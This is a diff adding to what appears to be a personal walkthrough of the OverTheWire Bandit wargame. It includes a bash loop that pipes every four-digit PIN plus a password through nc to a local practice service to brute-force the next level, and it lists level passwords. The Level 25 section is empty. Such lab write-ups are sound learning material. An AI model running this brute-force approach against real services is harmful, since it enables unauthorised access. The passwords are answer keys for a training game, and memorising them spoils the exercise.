@@ -49,3 +49,30 @@ cat password
 # you need to wait for a minute and read the password file
 ```
 **password**: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+## Level 24 -> 25
+### Look -> Bash Script
+#### Solve
+```bash
+mkdir /tmp/brutforce
+cd /tmp/brutforce
+vim bandit_pass.sh
+	#!/bin/bash
+	touch password
+	for i in {1000..9999};
+	do
+	        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"              
+	done | nc localhost 30002 > password
+	cat password | grep -v "wrong"
+```
+**password**: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+## Level 25 -> 26
+### Look -> ssh, cat, more, vi, ls, id, pwd
+#### Solve
+- a
+``` bash
+
+```
+
+**password**: 
